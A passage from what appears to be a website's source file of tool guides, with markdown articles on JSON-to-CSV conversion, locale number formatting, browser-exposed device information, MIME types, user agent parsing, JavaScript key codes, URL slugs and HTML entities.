- Exporting API data to Excel or Google Sheets for analysis
- Loading web application data into database tables
- Creating reports from JSON-structured data sources
- Sharing structured data with non-technical stakeholders
- Feeding data into machine learning pipelines that expect tabular format

## JSON Structures and CSV Mapping

### Flat JSON Array (Simple Case)
\`\`\`json
[
  {"id": 1, "name": "Alice", "email": "alice@example.com"},
  {"id": 2, "name": "Bob", "email": "bob@example.com"}
]
\`\`\`

Maps directly to CSV:
\`\`\`csv
id,name,email
1,Alice,alice@example.com
2,Bob,bob@example.com
\`\`\`

### Nested Objects (Challenge)
\`\`\`json
[
  {
    "id": 1,
    "user": {"name": "Alice", "age": 28},
    "address": {"city": "NYC", "country": "US"}
  }
]
\`\`\`

Options for handling nesting:
1. **Flatten**: \`user.name\`, \`user.age\`, \`address.city\`, \`address.country\`
2. **JSON stringify**: Keep nested objects as JSON strings in the CSV cell
3. **Ignore**: Omit nested objects

Flattening is usually preferred for analysis.

### Arrays Within Objects (Challenge)
\`\`\`json
[
  {"id": 1, "name": "Alice", "tags": ["admin", "editor"]}
]
\`\`\`

Options:
1. **Join**: \`"admin,editor"\` (pipe or comma separated in a single cell)
2. **One row per value**: Creates multiple CSV rows per JSON object
3. **Multiple columns**: \`tag1\`, \`tag2\`, etc.

## CSV Format Specification (RFC 4180)

### Basic Rules
- Fields separated by commas
- Records separated by newlines (CRLF in RFC 4180)
- Optional header row
- Fields may be quoted with double quotes
- Quoted fields may contain commas and newlines
- To include a double quote: \`""\` (escape by doubling)

### Common Variations
CSV isn't fully standardized. Variations include:
- **Delimiter**: tab (\`\\t\`), semicolon (\`;\`), pipe (\`|\`) instead of comma
- **Quote character**: Single quotes or no quotes
- **Line endings**: LF (Unix) vs. CRLF (Windows)
- **Encoding**: UTF-8, UTF-8 with BOM, Latin-1

Microsoft Excel uses semicolons as the default delimiter in many European locales (where commas are decimal separators), causing countless CSV parsing headaches.

## Handling Special Cases

### Empty Values
\`\`\`json
{"id": 1, "name": null, "email": ""}
\`\`\`
Null and empty string are both represented as empty CSV cells but have different semantics.

### Boolean Values
\`true\` and \`false\` in JSON become the strings "true" and "false" in CSV unless explicitly converted.

### Numeric Precision
JSON numbers can represent arbitrary precision floats. CSV transmits them as strings. Be cautious of floating-point precision loss during the round-trip.

### Unicode and Special Characters
All Unicode characters should be preserved. Cells containing commas, quotes, or newlines must be properly quoted.

## Programmatic Conversion

### JavaScript
\`\`\`javascript
function jsonToCsv(data) {
  const headers = Object.keys(data[0]);
  const rows = data.map(obj =>
    headers.map(h => JSON.stringify(obj[h] ?? '')).join(',')
  );
  return [headers.join(','), ...rows].join('\\n');
}
\`\`\`

### Python (pandas)
\`\`\`python
import pandas as pd
import json

with open('data.json') as f:
    data = json.load(f)

df = pd.json_normalize(data)  # Handles nested objects
df.to_csv('output.csv', index=False)
\`\`\`

### Command Line (jq)
\`\`\`bash
jq -r '["id","name","email"], (.[] | [.id, .name, .email]) | @csv' data.json
\`\`\`

## Using the JSON-to-CSV Converter

Our tool:
1. **Paste JSON data** — arrays of objects or single objects
2. **Configure options** — delimiter choice, quote handling, nested object strategy
3. **Preview the output** — see the CSV table before downloading
4. **Handle arrays** — choose how to represent array values
5. **Download CSV** — get the file ready for Excel or database import
6. **Copy to clipboard** — paste directly into spreadsheets

The tool handles edge cases automatically: proper quoting of fields containing commas, escaping double quotes, and consistent column ordering from potentially inconsistent JSON objects.
`,
  },
  {
    slug: 'number-formatter-guide',
    toolPath: '/number-formatter',
    title: 'Number Formatting: Thousands Separators, Decimals, and Locale Formats',
    description: 'Format numbers with thousands separators, decimal points, and currency symbols for different locales.',
    keywords: ['number formatter', 'number format', 'thousands separator', 'decimal format', 'locale number'],
    category: 'Math',
    publishedAt: '2025-08-18',
    content: `## Why Number Formatting Matters

The same number can be written in dozens of ways depending on locale, context, and convention. Formatting numbers correctly is essential for financial applications, data dashboards, internationalized software, and anywhere numbers are displayed to human users.

## Locale-Specific Number Formats

Numbers are formatted differently around the world:

| Locale | Example Number | Formatted |
|--------|---------------|-----------|
| en-US (English, USA) | 1234567.89 | 1,234,567.89 |
| de-DE (German, Germany) | 1234567.89 | 1.234.567,89 |
| fr-FR (French, France) | 1234567.89 | 1 234 567,89 |
| en-IN (English, India) | 1234567.89 | 12,34,567.89 |
| ja-JP (Japanese, Japan) | 1234567.89 | 1,234,567.89 |
| ar-SA (Arabic, Saudi Arabia) | 1234567.89 | ١٬٢٣٤٬٥٦٧٫٨٩ |

Key differences:
- **Decimal separator**: Period (.) in English-speaking countries, comma (,) in Europe
- **Thousands separator**: Comma, period, space, or apostrophe depending on locale
- **Grouping**: Most use groups of 3, India uses the lakh system (2,2,3 grouping)
- **Digit characters**: Arabic, Persian, and other scripts have their own digit symbols

## The Intl.NumberFormat API

Modern JavaScript provides \`Intl.NumberFormat\` for locale-aware number formatting:

\`\`\`javascript
// Currency formatting
new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD'
}).format(1234567.89);
// → "$1,234,567.89"

new Intl.NumberFormat('de-DE', {
  style: 'currency',
  currency: 'EUR'
}).format(1234567.89);
// → "1.234.567,89 €"

// Compact notation
new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'short'
}).format(1234567);
// → "1.2M"

// Percentage
new Intl.NumberFormat('en-US', {
  style: 'percent',
  minimumFractionDigits: 1
}).format(0.1234);
// → "12.3%"
\`\`\`

## Number Display Formats

### Standard Decimal
The default representation with decimal separator and optional grouping.

### Scientific Notation
Useful for very large or very small numbers:
- \`1.23456 × 10⁹\` (typographic)
- \`1.23456e9\` (programming notation)

### Compact/Abbreviation
Makes large numbers readable at a glance:
- 1,200 → "1.2K"
- 1,500,000 → "1.5M"
- 1,000,000,000 → "1B"

Compact notation is widely used in dashboards, social media follower counts, and financial summaries.

### Percentage
Convert decimal fractions to percentage format: 0.1234 → 12.34%

### Currency
Add currency symbol, code, or both:
- Symbol: $1,234.56
- Code: USD 1,234.56
- Name: 1,234.56 US dollars

### Ordinal
Number position: 1st, 2nd, 3rd, 4th... (varies by language)

## Precision and Rounding

### Significant Digits
The number of meaningful digits in a value:
- \`1,234.5678\` rounded to 4 significant digits = \`1,235\`
- \`0.001234\` rounded to 4 significant digits = \`0.001234\`

### Decimal Places
Fixed number of digits after the decimal:
- \`1234.5\` with 2 decimal places = \`1234.50\`
- \`1234.5678\` with 2 decimal places = \`1234.57\` (rounded)

### Rounding Modes
- **Round half up**: 2.5 → 3 (common in everyday use)
- **Round half to even (banker's rounding)**: 2.5 → 2, 3.5 → 4 (minimizes systematic bias)
- **Truncate**: 2.9 → 2 (drops the fractional part)

## Financial Number Formatting

Finance requires particular care:
- Always show exactly 2 decimal places for currencies with cents
- Some currencies have no cents (JPY, KRW) — never show decimal places
- Some currencies use 3 decimal places (KWD, BHD)
- Display negative values with parentheses in accounting: \`(1,234.56)\` instead of \`-1,234.56\`
- Show exact values, not compact notation, in financial statements

## Using the Number Formatter Tool

Our tool:
1. **Enter any number** — integers, decimals, large or small
2. **Choose locale** — see formatting for any regional standard
3. **Select format type** — decimal, currency, percentage, compact, scientific
4. **Configure precision** — decimal places or significant digits
5. **Choose currency** — for currency formatting, select from all ISO 4217 codes
6. **Copy formatted result** — ready to paste anywhere

Use it for localization work, financial applications, dashboard design, and understanding how numbers appear to users in different countries.
`,
  },
  {
    slug: 'device-information-guide',
    toolPath: '/device-information',
    title: 'Device Information: What Your Browser Reveals About You',
    description: 'See what information your browser exposes: screen size, OS, browser version, language, timezone, and more.',
    keywords: ['device information', 'browser fingerprint', 'user agent', 'screen resolution', 'browser info'],
    category: 'Web',
    publishedAt: '2025-08-19',
    content: `## What Information Does Your Browser Share?

Every time you visit a website, your browser automatically shares information about your device and configuration. This data is used for analytics, compatibility checks, security, and unfortunately, fingerprinting for tracking. Understanding what's exposed helps you make informed privacy decisions.

## Browser-Exposed Information

### User Agent String
The most basic device identifier:
\`\`\`
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
\`\`\`

Contains:
- Operating system (Windows 10, macOS, Android, iOS)
- Browser and version (Chrome 120)
- CPU architecture (x64)
- Browser engine (WebKit, Gecko, Blink)

User-Agent is being phased out in favor of the more privacy-preserving User-Agent Client Hints API, where websites request specific attributes rather than receiving everything.

### Screen Information
Available via JavaScript's \`screen\` object:
- **Width/Height**: Total screen dimensions (e.g., 2560x1440)
- **Available Width/Height**: Usable area excluding taskbar
- **Color Depth**: Bits per channel (usually 24-bit)
- **Pixel Ratio**: Physical to logical pixel ratio (1x on standard, 2x+ on Retina/HiDPI)

### Viewport Information
The visible area of the browser window:
- **Inner Width/Height**: Visible content area size
- **Outer Width/Height**: Browser window total size including toolbars
- **Page Offset**: Scroll position

### Connection Information
The Network Information API exposes:
- Connection type (wifi, cellular, ethernet)
- Effective connection type (4g, 3g, 2g, slow-2g)
- Estimated bandwidth
- Estimated latency

Not available in all browsers (Firefox has disabled it for privacy reasons).

### Battery Status
The Battery API (deprecated in many browsers) could expose:
- Battery level percentage
- Charging/discharging state
- Time until charged/discharged

Multiple browsers removed this API due to fingerprinting concerns.

### Hardware Concurrency
\`navigator.hardwareConcurrency\` reports the number of logical CPU cores available. Useful for deciding how many Web Workers to create.

### Device Memory
\`navigator.deviceMemory\` returns approximate RAM in gigabytes (rounded to the nearest power of 2 for privacy): 0.25, 0.5, 1, 2, 4, 8.

### Language and Locale
\`navigator.language\` and \`navigator.languages\` expose:
- Primary browser language
- Ordered list of preferred languages

Used for serving content in the user's language without requiring explicit selection.

### Online Status
\`navigator.onLine\` indicates whether the browser believes it has internet connectivity. Used to show offline-mode UI.

## Browser Fingerprinting

Combining multiple browser attributes creates a **fingerprint** — a identifier that may be unique to your device even without cookies:

### Canvas Fingerprinting
Drawing text/graphics to an invisible canvas and hashing the result. Different GPU drivers, fonts, and OS settings produce slightly different renderings, creating a fingerprint.

### WebGL Fingerprinting
Querying the GPU's capabilities and renderer string reveals the specific GPU and driver version.

### Audio Fingerprinting
AudioContext processing produces slightly different results on different hardware.

### Font Fingerprinting
Checking which fonts are installed (via CSS font loading detection) reveals OS and installed application signatures.

### Combined Entropy
Each attribute provides partial entropy. Combined, they can uniquely identify a device with high confidence even across browser sessions.

## Privacy Implications

Understanding device information exposure matters for:
- **Users**: Know what data you're sharing and use privacy tools (Brave, Firefox with uBlock Origin, Tor Browser) if concerned
- **Developers**: Only collect device data you actually need; disclose data collection in privacy policies
- **Security professionals**: Device fingerprinting can detect bot traffic and account takeover attempts

## Using the Device Information Tool

Our tool displays:
1. **Browser details** — name, version, engine, and user agent string
2. **OS information** — operating system and version
3. **Screen specs** — dimensions, color depth, pixel ratio
4. **Hardware info** — CPU cores, RAM estimate
5. **Network details** — connection type and speed estimate
6. **Location data** — timezone and language preferences
7. **Feature support** — which Web APIs are available in your browser

All processing happens locally — no data is sent to any server.
`,
  },
  {
    slug: 'mime-types-guide',
    toolPath: '/mime-types',
    title: 'MIME Types: What They Are and How to Use Them',
    description: 'Learn about MIME types (media types), how they work in HTTP headers, and find the right type for any file extension.',
    keywords: ['MIME types', 'media type', 'content type', 'HTTP header', 'file extension MIME'],
    category: 'Web',
    publishedAt: '2025-08-20',
    content: `## What Is a MIME Type?

A **MIME type** (Multipurpose Internet Mail Extensions type, also called Media Type or Content Type) is a label that identifies the format of data. Originally created for email attachments, MIME types are now used everywhere data format identification is needed — HTTP responses, file uploads, data URLs, and HTML.

## MIME Type Syntax

MIME types follow this format:
\`\`\`
type/subtype
type/subtype; parameter=value
\`\`\`

Examples:
- \`text/html\` — HTML document
- \`text/html; charset=UTF-8\` — HTML with encoding parameter
- \`application/json\` — JSON data
- \`image/png\` — PNG image
- \`multipart/form-data; boundary=something\` — Form data with boundary

## MIME Type Categories

### text
Human-readable text content:
- \`text/plain\` — Plain text
- \`text/html\` — HTML markup
- \`text/css\` — CSS stylesheets
- \`text/javascript\` — JavaScript (though \`application/javascript\` is more accurate)
- \`text/csv\` — CSV data

### image
Visual content:
- \`image/jpeg\` — JPEG photos
- \`image/png\` — PNG with transparency
- \`image/gif\` — Animated GIFs
- \`image/webp\` — Modern efficient format
- \`image/svg+xml\` — SVG vector graphics
- \`image/avif\` — AV1 Image File Format (modern, high efficiency)

### audio
Sound content:
- \`audio/mpeg\` — MP3 audio
- \`audio/ogg\` — Ogg Vorbis
- \`audio/wav\` — Uncompressed audio
- \`audio/aac\` — AAC audio
- \`audio/webm\` — WebM audio

### video
Video content:
- \`video/mp4\` — MP4 video
- \`video/webm\` — WebM video
- \`video/ogg\` — Ogg Theora

### application
Non-text binary or structured data:
- \`application/json\` — JSON data
- \`application/xml\` — XML data
- \`application/pdf\` — PDF documents
- \`application/zip\` — ZIP archives
- \`application/gzip\` — Gzip compressed
- \`application/octet-stream\` — Unknown binary (generic binary)
- \`application/x-www-form-urlencoded\` — HTML form data

### multipart
Composite content with multiple parts:
- \`multipart/form-data\` — File upload forms
- \`multipart/mixed\` — Email with attachments

## MIME Types in HTTP

The \`Content-Type\` header tells the recipient what format the response body is in:

\`\`\`http
HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8

{"status": "ok"}
\`\`\`

The \`Accept\` header tells the server what formats the client can handle:
\`\`\`http
GET /api/users HTTP/1.1
Accept: application/json, text/plain, */*
\`\`\`

## Content-Type in HTML Forms

HTML form encoding is controlled by the \`enctype\` attribute:
\`\`\`html
<!-- URL-encoded (default) -->
<form method="post" enctype="application/x-www-form-urlencoded">

<!-- Required for file uploads -->
<form method="post" enctype="multipart/form-data">
\`\`\`

## Common MIME Type Pitfalls

### \`application/octet-stream\`
The generic binary type. Browsers download rather than display files with this type. Use specific types for correct browser handling.

### \`text/javascript\` vs. \`application/javascript\`
Both are widely used; modern spec recommends \`text/javascript\`. In practice, both work in browsers.

### \`application/x-www-form-urlencoded\` vs. \`multipart/form-data\`
For API POST requests with JSON body, use \`application/json\`. Use \`multipart/form-data\` only when uploading actual binary files.

### MIME Sniffing
Some browsers ignore the declared Content-Type and "sniff" the actual content to determine the type. This can be a security risk. The \`X-Content-Type-Options: nosniff\` header prevents this behavior.

## File Extensions to MIME Types

Common mappings:
| Extension | MIME Type |
|-----------|-----------|
| .html | text/html |
| .css | text/css |
| .js | text/javascript |
| .json | application/json |
| .png | image/png |
| .jpg | image/jpeg |
| .pdf | application/pdf |
| .zip | application/zip |
| .mp4 | video/mp4 |
| .mp3 | audio/mpeg |

## Using the MIME Types Reference Tool

Our tool:
1. **Search by extension** — find the MIME type for any file extension
2. **Search by MIME type** — find the file extension for any MIME type
3. **Browse categories** — explore all types in a category
4. **Copy type** — one-click copy for use in code
5. **See browser support** — which types browsers handle natively

Essential reference for web developers setting Content-Type headers, handling file uploads, and configuring web servers.
`,
  },
  {
    slug: 'user-agent-parser-guide',
    toolPath: '/user-agent-parser',
    title: 'User Agent Parser: Detect Browser, OS, and Device from User Agent Strings',
    description: 'Parse and understand User Agent strings. Learn browser detection, OS identification, and device type detection.',
    keywords: ['user agent parser', 'user agent string', 'browser detection', 'OS detection', 'device detection'],
    category: 'Web',
    publishedAt: '2025-08-21',
    content: `## What Is a User Agent String?

A user agent string is a text identifier that web browsers and other HTTP clients send in the User-Agent request header. It tells servers what browser, operating system, and rendering engine is being used. Originally designed for content negotiation, user agent strings have grown into complex, legacy-filled identifiers reflecting decades of browser compatibility wars.

## The User Agent String Problem

Early browsers sent simple strings like Mosaic/0.9. When Netscape (Mozilla) dominated, servers began serving enhanced content only to Mozilla browsers. Internet Explorer responded by starting its UA with Mozilla/. Chrome, based on WebKit, included AppleWebKit to inherit Safari-optimized content. Every new browser added tokens to appear compatible with existing ones. The result: virtually every browser starts with Mozilla/5.0 and claims compatibility with engines it does not use.

## Anatomy of a User Agent String

A modern Chrome user agent on Windows includes: the Mozilla/5.0 compatibility token, a platform section showing Windows NT 10.0 and x64 architecture, the WebKit engine version, the Chrome browser version, and a Safari compatibility token. Each component exists for historical backward-compatibility reasons rather than accuracy.

## Key User Agent Properties

Browser identification: family name (Chrome, Firefox, Safari, Edge), version and build number, rendering engine (Blink, Gecko, WebKit).

Operating system: family (Windows, macOS, Linux, Android, iOS), version, architecture.

Device type: desktop vs. mobile vs. tablet, and for mobile devices, manufacturer and model name.

## User-Agent Client Hints

Google is phasing out the information-rich user agent string in favor of User-Agent Client Hints (UA-CH), where servers explicitly request only the specific attributes they need through HTTP headers. This approach improves privacy by reducing passive data collection, makes fingerprinting harder since clients control what they share, and provides explicit rather than implicit consent for data sharing.

## Bot Detection via User Agent

Many requests come from bots, crawlers, and automated tools, each with their own user agent strings. Googlebot identifies Google's web crawler, facebookexternalhit identifies Facebook's link preview fetcher, Python-requests identifies the Python requests library, and curl identifies the curl command-line tool. Server logs contain significant bot traffic. Identifying bot user agents helps separate human from automated traffic in analytics reports and security monitoring.

## User Agent Spoofing

User agents can be easily spoofed, and this happens frequently. Privacy-focused browsers randomize or minimize their UA strings to prevent tracking. Developers override user agents to test how sites appear in different browsers or on mobile devices. Web scrapers pretend to be regular browsers to avoid bot detection. Mobile device simulators set mobile user agents.

Because spoofing is trivial, user agent data should never be trusted for security decisions. It is useful for analytics and optional capability detection, but must not be used to gatekeep functionality or make authorization decisions.

## Practical Parsing Libraries

Reliable UA parsing requires dedicated libraries that maintain regularly updated databases of browser patterns. Popular options include ua-parser-js for JavaScript (works in both Node.js and browsers), user-agents for Python (based on Google's UA database), device-detector for PHP with comprehensive device identification, and WhichBrowser for PHP with a focus on mobile device detection. Raw regex-based parsing quickly becomes unmaintainable as the browser ecosystem evolves.

## User Agents in Analytics

Analytics platforms use user agent parsing to report on browser distribution, OS breakdown, and mobile vs. desktop traffic. This data informs decisions about which browsers to support, whether to invest in mobile optimization, and which JavaScript features can be used without polyfills.

## Using the User Agent Parser Tool

Our tool automatically detects and displays your current browser user agent string, then parses and shows all components: browser name and version, operating system, device type, and rendering engine. You can also paste any custom UA string for analysis. The tool identifies known bot user agents by matching against a curated database of crawler signatures.

Use it for debugging user agent detection logic in web applications, analyzing access logs for bot traffic patterns, verifying mobile detection code works correctly, and documenting what browsers your users are actually running.
`,
  },
  {
    slug: 'keycode-info-guide',
    toolPath: '/keycode-info',
    title: 'JavaScript Key Codes: Every Keyboard Key and Its Event Properties',
    description: 'Find the keyCode, key, and code for any keyboard key. Learn the difference between keyCode, which, key, and code.',
    keywords: ['keycode', 'JavaScript key event', 'key code reference', 'event.key', 'keyboard codes'],
    category: 'Web',
    publishedAt: '2025-08-22',
    content: `## Understanding JavaScript Keyboard Events

Keyboard events in JavaScript expose rich information about which key was pressed, in what context, and with which modifier keys. Understanding the distinction between the different key properties is essential for building accessible keyboard interfaces, games, and productivity tools.

## Key Event Properties

When a keyboard event fires, the event object contains several properties:

### event.key (Recommended)
Returns the semantic value of the key pressed:
- Letter keys: "a", "A", "z", "Z"
- Special keys: "Enter", "Backspace", "Tab", "Escape", "ArrowLeft"
- Modifier keys: "Shift", "Control", "Alt", "Meta"
- Function keys: "F1" through "F12"

This is the modern standard for identifying keys. The value is locale-aware (handles international keyboards correctly) and semantic (tells you what the key means, not its physical location).

### event.code (Physical Key Location)
Returns the physical key identifier on the keyboard, independent of the current keyboard layout:
- "KeyA", "KeyB", "KeyZ" for letter keys
- "Digit1", "Digit2" for number row digits
- "Numpad1", "Numpad2" for numpad digits
- "ArrowLeft", "ArrowUp" for arrow keys
- "ShiftLeft", "ShiftRight" distinguish which Shift key

Use event.code when physical key position matters (gaming WASD controls) and you want layout-independent behavior.

### event.keyCode (Deprecated)
The numeric code for the key pressed. This legacy property has browser inconsistencies and should not be used in new code. For example, "A" is 65, "Enter" is 13, "Escape" is 27, "Space" is 32.

### event.which (Deprecated)
Similar to keyCode but originally intended for mouse events. Also deprecated in favor of event.key.

## Modifier Keys

Keyboard events expose modifier key state through boolean properties:
- **event.shiftKey**: Shift is held
- **event.ctrlKey**: Control is held
- **event.altKey**: Alt (Option on Mac) is held
- **event.metaKey**: Meta key (Windows key on PC, Command on Mac) is held

Common keyboard shortcuts use these combinations:
- Ctrl+C / Cmd+C: Copy
- Ctrl+Z / Cmd+Z: Undo
- Ctrl+Shift+Z / Cmd+Shift+Z: Redo
- Alt+F4: Close window (Windows)

## Keyboard Event Types

Three main keyboard event types fire in sequence:

1. **keydown**: Fires when a key is pressed down. Repeats while held. Most keyboard shortcuts should listen here.
2. **keypress** (deprecated): Fired for printable characters only. Deprecated, use keydown instead.
3. **keyup**: Fires when a key is released. Never repeats.

For text input tracking, listen on keydown or use the input event on form elements.

## Practical Event Handling Patterns

### Detecting Keyboard Shortcuts
\`\`\`javascript
document.addEventListener('keydown', (e) => {
  if ((e.ctrlKey || e.metaKey) && e.key === 's') {
    e.preventDefault(); // Prevent browser's save dialog
    saveDocument();
  }
});
\`\`\`

### WASD Game Controls
\`\`\`javascript
const keys = new Set();
document.addEventListener('keydown', (e) => keys.add(e.code));
document.addEventListener('keyup', (e) => keys.delete(e.code));

function gameLoop() {
  if (keys.has('KeyW')) moveUp();
  if (keys.has('KeyS')) moveDown();
  if (keys.has('KeyA')) moveLeft();
  if (keys.has('KeyD')) moveRight();
  requestAnimationFrame(gameLoop);
}
\`\`\`

### Escape to Close Modal
\`\`\`javascript
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') closeModal();
});
\`\`\`

## Key Codes Reference

Commonly used key codes in JavaScript:

| Key | event.key | event.code | keyCode |
|-----|-----------|------------|---------|
| Enter | "Enter" | "Enter" | 13 |
| Escape | "Escape" | "Escape" | 27 |
| Space | " " | "Space" | 32 |
| Arrow Left | "ArrowLeft" | "ArrowLeft" | 37 |
| Arrow Up | "ArrowUp" | "ArrowUp" | 38 |
| Arrow Right | "ArrowRight" | "ArrowRight" | 39 |
| Arrow Down | "ArrowDown" | "ArrowDown" | 40 |
| Backspace | "Backspace" | "Backspace" | 8 |
| Delete | "Delete" | "Delete" | 46 |
| Tab | "Tab" | "Tab" | 9 |

## Accessibility and Keyboard Navigation

WCAG 2.1 requires all functionality to be operable by keyboard. Key principles:
- All interactive elements must receive keyboard focus
- Focus must be visible (no removing outline without alternative)
- Tab order must be logical and follow visual layout
- Custom widgets must implement appropriate keyboard patterns (arrow keys for menus, Enter/Space for activation)
- Modal dialogs must trap focus within them while open
- Provide skip navigation links to bypass repeated content

ARIA patterns like menu, listbox, dialog, and tablist define expected keyboard behaviors for complex widgets.

## Using the Keycode Info Tool

Our tool:
1. **Press any key** — instantly shows all properties for that key event
2. **Displays all properties** — key, code, keyCode, which, charCode
3. **Shows modifier state** — which modifier keys are held
4. **Copy values** — one-click copy of any property value
5. **Key history** — track the last several key presses
6. **Comparison mode** — see how different keyboards report the same keys

Essential for debugging keyboard handling code, understanding browser differences, and implementing correct keyboard shortcuts.
`,
  },
  {
    slug: 'slugify-string-guide',
    toolPath: '/slugify-string',
    title: 'URL Slugs Explained: How to Create SEO-Friendly URLs',
    description: 'Convert any text into a URL-friendly slug. Learn best practices for SEO-friendly URL structure.',
    keywords: ['slugify', 'URL slug', 'SEO URL', 'create slug', 'URL friendly string'],
    category: 'Web',
    publishedAt: '2025-08-23',
    content: `## What Is a URL Slug?

A **slug** is the human-readable, URL-friendly part of a web address that identifies a specific page. The word "slug" comes from newspaper typography, where it referred to the short name given to a story in production.

Example URL with slug: \`https://example.com/blog/how-to-bake-sourdough-bread\`
The slug is: \`how-to-bake-sourdough-bread\`

Slugs appear in blog posts, product pages, news articles, user profiles, and anywhere URLs need to be descriptive and shareable.

## What Makes a Good Slug?

A well-formed slug:
- Uses only lowercase letters, numbers, and hyphens
- Has no spaces (replaced with hyphens)
- Has no special characters (removed or transliterated)
- Has no consecutive or trailing hyphens
- Is concise but descriptive (30-60 characters ideal)
- Contains the primary keyword for SEO

## Slugification Algorithm

Converting any text to a slug involves several steps:

1. **Unicode normalization**: Decompose characters (e.g., é → e + combining accent)
2. **Transliteration**: Convert non-ASCII to closest ASCII equivalent
3. **Lowercase**: Convert to all lowercase
4. **Remove special characters**: Keep only letters, numbers, and spaces
5. **Replace spaces with hyphens**: The hyphen is the standard word separator
6. **Remove consecutive hyphens**: Replace multiple hyphens with single
7. **Trim hyphens**: Remove leading and trailing hyphens

Example transformation:
\`\`\`
Input:  "The World's Best Café & Restaurant!"
Step 1: "The World's Best Cafe & Restaurant!"  (café → cafe)
Step 3: "the world's best cafe & restaurant!"  (lowercase)
Step 4: "the worlds best cafe  restaurant"     (remove ' & !)
Step 5: "the-worlds-best-cafe--restaurant"     (spaces to hyphens)
Step 6: "the-worlds-best-cafe-restaurant"      (remove double --)
Output: "the-worlds-best-cafe-restaurant"
\`\`\`

## Language-Specific Considerations

### German (Umlauts)
German umlauts have standard transliterations:
- ä → ae
- ö → oe
- ü → ue
- ß → ss

\`"Schöne Grüße"\` → \`"schoene-gruesse"\`

### French and Spanish Accents
Accented characters map to their base form:
- é, è, ê, ë → e
- à, â, ä → a
- ñ → n
- ç → c

### CJK Characters (Chinese, Japanese, Korean)
CJK characters cannot be transliterated to meaningful Latin slugs. Options:
- Use pinyin romanization for Chinese
- Use romaji for Japanese
- Use the English translation for the page title
- Use a hash or ID-based slug

### Arabic, Hebrew, Russian
Right-to-left scripts and Cyrillic often require locale-specific transliteration rules.

## SEO Best Practices for Slugs

### Use Keywords
The slug is a ranking factor in Google's algorithm. Include the primary keyword naturally:
- Good: \`how-to-install-postgresql\`
- Avoid: \`post-1234\` or \`page-2024-01-15\`

### Keep It Short
Shorter URLs are more shareable and cleaner:
- Good: \`/blog/sourdough-bread-recipe\`
- Avoid: \`/blog/how-to-make-delicious-homemade-sourdough-bread-step-by-step-guide\`

### Use Hyphens, Not Underscores
Google treats hyphens as word separators and underscores as word joiners:
- \`bread-recipe\` → "bread" and "recipe" are separate keywords
- \`bread_recipe\` → treated as single word "bread_recipe"

### Avoid Stop Words
Remove common words that don't add SEO value:
- \`the\`, \`a\`, \`an\`, \`and\`, \`or\`, \`but\`, \`in\`, \`on\`, \`at\`

\`"how-to-bake-a-delicious-bread"\` can become \`"how-to-bake-delicious-bread"\`

### Handle Duplicates
When creating slugs from user-generated content, implement uniqueness:
- \`my-post\` → already exists → \`my-post-2\` → exists → \`my-post-3\`
- Or use a random suffix: \`my-post-a7b9\`

## Slugs in Different Frameworks

### Next.js (Dynamic Routes)
File: \`pages/blog/[slug].js\`
\`\`\`javascript
export async function getStaticProps({ params }) {
  const post = getPostBySlug(params.slug);
  return { props: { post } };
}
\`\`\`

### Express.js
\`\`\`javascript
app.get('/posts/:slug', (req, res) => {
  const post = db.posts.findBySlug(req.params.slug);
  res.render('post', { post });
});
\`\`\`

### Django
\`\`\`python
from django.utils.text import slugify
slug = slugify("Hello World!")  # "hello-world"
\`\`\`

## Using the Slugify Tool

Our tool:
1. **Enter any text** — titles, names, phrases in any language
2. **Instant slug output** — see the converted slug in real time
3. **Multiple options** — configure separator character, case, stop word removal
4. **Unicode handling** — proper transliteration of accented and special characters
5. **Copy slug** — one-click copy for immediate use

Use it for generating consistent slugs for blog posts, product names, category pages, and any URL that needs to be human-readable and SEO-friendly.
`,
  },
  {
    slug: 'html-entities-guide',
    toolPath: '/html-entities',
    title: 'HTML Entities: Encode Special Characters for Safe Web Display',
    description: 'Learn which HTML characters need encoding, common entity names, and how to prevent XSS with proper encoding.',
    keywords: ['HTML entities', 'HTML encode', 'HTML escape', 'special characters HTML', 'XSS prevention'],
    category: 'Web',
    publishedAt: '2025-08-24',
    content: `## Why HTML Encoding Matters

HTML uses specific characters for its syntax: \`<\` and \`>\` for tags, \`&\` for entities, \`"\` for attribute values, and \`'\` for alternate attribute quoting. When these characters appear in content (not as HTML structure), they must be encoded as HTML entities to prevent browsers from misinterpreting them as HTML syntax.

Unencoded special characters cause two major problems:
1. **Broken HTML**: The page renders incorrectly as browsers parse characters as markup
2. **XSS vulnerabilities**: User input displayed without encoding can execute malicious scripts

## HTML Entity Syntax

HTML entities can be expressed in three forms:

### Named Entities
The most readable form using standard names:
- \`&amp;\` → &
- \`&lt;\` → <
- \`&gt;\` → >
- \`&quot;\` → "
- \`&apos;\` → '
- \`&nbsp;\` → non-breaking space
- \`&copy;\` → ©
- \`&reg;\` → ®
- \`&trade;\` → ™
- \`&euro;\` → €

### Decimal Numeric References
Using the Unicode code point in decimal:
- \`&#60;\` → < (60 decimal)
- \`&#62;\` → > (62 decimal)
- \`&#169;\` → © (169 decimal)
- \`&#8364;\` → € (8364 decimal)

### Hexadecimal Numeric References
Using the Unicode code point in hexadecimal (prefixed with x):
- \`&#x3C;\` → < (0x3C hex)
- \`&#x3E;\` → > (0x3E hex)
- \`&#xA9;\` → © (0xA9 hex)
- \`&#x20AC;\` → € (0x20AC hex)

## Essential HTML Entities to Know

### The Security-Critical Five
These five characters MUST be encoded when displaying user-generated content:

| Character | Entity | When to Encode |
|-----------|--------|----------------|
| & | \`&amp;\` | Always — start of entity syntax |
| < | \`&lt;\` | In text content and attribute values |
| > | \`&gt;\` | In text content |
| " | \`&quot;\` | In attribute values (double-quoted) |
| ' | \`&#39;\` or \`&apos;\` | In attribute values (single-quoted) |

### Typography Entities
Common typographic characters:
- \`&mdash;\` → — (em dash, longer)
- \`&ndash;\` → – (en dash, shorter)
- \`&lsquo;\` \`&rsquo;\` → ' ' (curly single quotes)
- \`&ldquo;\` \`&rdquo;\` → " " (curly double quotes)
- \`&hellip;\` → … (ellipsis)
- \`&bull;\` → • (bullet)
- \`&middot;\` → · (middle dot)

### Mathematical and Scientific
- \`&times;\` → × (multiplication sign)
- \`&divide;\` → ÷ (division sign)
- \`&plusmn;\` → ± (plus-minus)
- \`&deg;\` → ° (degree symbol)
- \`&infin;\` → ∞ (infinity)
